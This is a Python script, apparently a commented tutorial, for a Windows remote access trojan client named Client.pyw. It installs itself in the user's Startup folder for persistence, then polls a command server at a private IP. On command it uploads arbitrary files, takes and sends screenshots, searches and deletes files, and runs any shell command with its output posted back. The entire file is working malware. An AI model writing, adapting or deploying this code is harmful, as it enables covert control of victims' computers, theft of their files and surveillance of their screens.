#first import all required module for this script
import requests
import subprocess 
import time
import datetime
import os
import winshell
from win32com.client import Dispatch
import pyautogui #it help to capture the screen
import tempfile #used this module to store snapshot of desktop in temp folder

save = tempfile.mkdtemp("screen")#make an folder in temp
#print(save)
username = os.getlogin() #to get log in username
source = os.listdir() # it return list of present files current in directory
#now set the path of startup folder
destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
cwd = os.getcwd()

def main():
    path = os.path.join(destination, "Client.pyw - Shortcut.lnk")#here set the path along it's name 7 extension
    #now we have to set the link file source
    target = r""+cwd+"\Client.pyw"
    #now set the current file icon for it
    icon = r""+cwd+"\Client.pyw"
    for files in source:
        if files == "Client.pyw":
            #here we have to pass all objects we are created for sent icon,path & target etc
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()


#it's done let's call it by writing funcation name
#we also look for it currently exit in startup folder or not
shortcut = 'Client.pyw - Shortcut.lnk'
if shortcut in destination:
    pass
else:
    main()




#first we write infinite loop for sending request and other operation
while True: 
    req = requests.get('http://192.168.208.136')# Send GET request to host machine and the ip address which we use here are server ip address
    command = req.text  # Store the received txt into command variable

    if 'terminate' in command: #here terminate command use for break the connection
        break 

    elif 'grab' in command: # here we use grab command to send file from client pc to server pc
        grab,path=command.split(' ') #it help to differentiate grab command & file name

        if os.path.exists(path): #look for file exits or not
            url='http://192.168.208.136/store'   #Append /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
            r=requests.post(url, files=files) # Send the file
            #requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://192.168.208.136', data='[-] Not able to find the file !' )
    elif 'snapshot' in command: # look for snapshot in command and enter above codes for sending
        screenshot = pyautogui.screenshot()
        screenshot.save(save+'\Screenshot.png')#here we type path also along with file name
        url='http://192.168.208.136/store'
        files = {'file': open(save+'\Screenshot.png', 'rb')} #and access the snapshot by giving permission
        r=requests.post(url, files=files)
    elif 'search' in command:
        command = command[7:]# look for only file name and remove the search word.
        path,ext=command.split('*')#remove the * from it. we look for extension.
        list = ''  # here we define a string where we will append our result on it.
        for dirpath, dirname, files in os.walk(path): #os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values
            #that three values couble be dirpath, dirname, files
            for file in files:
                if file.endswith(ext):
                    list = list + '\n' + os.path.join(dirpath, file)
        r=requests.post("http://192.168.208.136", data= list)
    elif 'cd' in command:
        if len(command)<=2: #we look for path
            r=requests.post("http://192.168.208.136", data= "Enter with Location")
        else:
            code,directory = command.split(' ') #split the path and cd command
            if directory == "Desktop":#here we check for Desktop commands
                os.chdir('C:\\Users\\'+username+'\\'+directory)
                r=requests.post("http://192.168.208.136", data= "changes to "+os.getcwd())
            else:
                os.chdir(directory) # changing the directory
                r=requests.post("http://192.168.208.136", data= "changes to "+os.getcwd())
    elif 'remove' in command:
        if len(command)<=5:
            r=requests.post("http://192.168.208.136", data= "also enter the filename")
        else:
            code,filename = command.split(' ') #split the filename and remove command
            if os.path.exists(filename):
                os.remove(filename)
            else:
                r=requests.post("http://192.168.208.136", data= "The file does not exist")
    else:
        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        post_response = requests.post(url='http://192.168.208.136', data=CMD.stdout.read() ) 
        post_response = requests.post(url='http://192.168.208.136', data=CMD.stderr.read() )  
    time.sleep(1)

#that's it here we done Client.py python script
